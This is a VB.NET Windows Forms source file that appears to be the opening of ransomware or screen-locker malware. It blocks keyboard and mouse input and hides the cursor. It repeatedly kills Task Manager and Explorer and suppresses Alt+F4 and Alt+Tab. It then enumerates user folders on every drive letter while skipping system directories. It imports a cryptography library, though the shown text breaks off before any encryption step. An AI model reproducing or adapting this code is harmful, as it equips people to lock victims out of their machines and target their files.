Imports System.Security.Cryptography
Imports System.Text
Imports System.IO

Public Class Form1
    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Integer) As Integer
    Dim filenamez As String

    Private Sub Form1_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        Dim t As New Threading.Thread(AddressOf block)
        t.Start()

        Dim t2 As New Threading.Thread(AddressOf block2)
        t2.Start()
        If e.KeyData = Keys.Alt + Keys.F4 Then
            e.Handled = True
        End If
        If e.KeyData = Keys.Alt + Keys.Tab Then
            e.Handled = True
        End If

    End Sub

    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Sub block2()
        While True
            For Each p As Process In Process.GetProcessesByName("explorer")
                p.Kill()

            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label1.Left = (Label1.Parent.Width \ 2) - (Label1.Width \ 2)
        Label1.Top = (Label1.Parent.Height \ 2) - (Label1.Height \ 2)


        PictureBox1.Left = (PictureBox1.Parent.Width \ 2) - (PictureBox1.Width \ 2)
        PictureBox1.Top = (PictureBox1.Parent.Height \ 2) - 85


        Label2.Left = (Label2.Parent.Width \ 2) - (Label2.Width \ 2)



        BlockInput(1)
        ShowCursor(0)
        If IO.Directory.Exists("C:\") Then
            If IO.Directory.Exists("D:\") Then
                Try
                    For Each fdir As String In My.Computer.FileSystem.GetDirectories("C:\")
                        If fdir.EndsWith("Bin") Then
                        Else
                            If fdir.EndsWith("indows") Then
                            Else
                                If fdir.EndsWith("tings") Then
                                Else
                                    If fdir.EndsWith("System Volume Information") Then
                                    Else
                                        If fdir.EndsWith("cache") Then
                                        Else
                                            If fdir.EndsWith("very") Then
                                            Else
                                                If fdir.EndsWith("rogram Files (x86)") Then
                                                Else
                                                    If fdir.EndsWith("rogram Files") Then
                                                    Else
                                                        If fdir.EndsWith("boot") Then
                                                        Else
                                                            If fdir.EndsWith("efi") Then
                                                            Else
                                                                If fdir.EndsWith(".old") Then
                                                                Else
                                                                    ListBox1.Items.Add(fdir)
                                                                    ListBox9.Items.Add(fdir)
                                                                End If

                                                            End If
                                                        End If
                                                    End If
                                                End If

                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If

                    Next
                Catch ex As Exception
                End Try
                Try
                    For Each fdir As String In My.Computer.FileSystem.GetDirectories("D:\")
                        If fdir.EndsWith("Bin") Then
                        Else
                            If fdir.EndsWith("indows") Then
                            Else
                                If fdir.EndsWith("tings") Then
                                Else
                                    If fdir.EndsWith("System Volume Information") Then
                                    Else
                                        If fdir.EndsWith("cache") Then
                                        Else
                                            If fdir.EndsWith("very") Then
                                            Else
                                                If fdir.EndsWith("rogram Files (x86)") Then
                                                Else
                                                    If fdir.EndsWith("rogram Files") Then
                                                    Else
                                                        If fdir.EndsWith("boot") Then
                                                        Else
                                                            If fdir.EndsWith("efi") Then
                                                            Else
                                                                If fdir.EndsWith(".old") Then
                                                                Else
                                                                    ListBox1.Items.Add(fdir)
                                                                    ListBox9.Items.Add(fdir)
                                                                End If

                                                            End If
                                                        End If
                                                    End If
                                                End If

                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If

                    Next
                Catch ex As Exception
                End Try
            End If
        Else
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("A:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("B:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("C:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("D:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("E:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("F:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("G:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("H:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("I:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("J:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("K:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("L:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("M:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("N:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("O:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("P:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("Q:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("R:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("S:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("T:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("U:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("V:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("W:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("X:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("Y:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try
            Try
                For Each fdir As String In My.Computer.FileSystem.GetDirectories("Z:\")
                    If fdir.EndsWith("Bin") Then
                    Else
                        If fdir.EndsWith("indows") Then
                        Else
                            If fdir.EndsWith("tings") Then
                            Else
                                If fdir.EndsWith("System Volume Information") Then
                                Else
                                    If fdir.EndsWith("cache") Then
                                    Else
                                        If fdir.EndsWith("very") Then
                                        Else
                                            If fdir.EndsWith("rogram Files (x86)") Then
                                            Else
                                                If fdir.EndsWith("rogram Files") Then
                                                Else
                                                    If fdir.EndsWith("boot") Then
                                                    Else
                                                        If fdir.EndsWith("efi") Then
                                                        Else
                                                            If fdir.EndsWith(".old") Then
                                                            Else
                                                                ListBox1.Items.Add(fdir)
                                                                ListBox9.Items.Add(fdir)
                                                            End If

                                                        End If
                                                    End If
                                                End If
                                            End If

                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If

                Next
            Catch ex As Exception
            End Try

        End If
        'layer 2
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            Timer2.Start()
        Else
            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox2.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar1.Increment(1)
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        ProgressBar2.Maximum = ListBox2.Items.Count
        If ProgressBar2.Value = ListBox2.Items.Count Then
            Timer2.Stop()
            Timer3.Start()
        Else
            ListBox2.SelectedIndex = ProgressBar2.Value
            ListBox2.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox2.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox3.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar2.Increment(1)
        End If
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        ProgressBar3.Maximum = ListBox3.Items.Count
        If ProgressBar3.Value = ListBox3.Items.Count Then
            Timer3.Stop()
            Timer4.Start()
        Else
            ListBox3.SelectedIndex = ProgressBar3.Value

            ListBox3.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox3.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetDirectories(filenamez)
                    ListBox4.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar3.Increment(1)
        End If
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        ProgressBar4.Maximum = ListBox4.Items.Count
        If ProgressBar4.Value = ListBox4.Items.Count Then
            Timer4.Stop()
            Timer5.Start()
        Else
            ListBox4.SelectedIndex = ProgressBar4.Value

            ListBox4.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox4.SelectedItem)
            Try

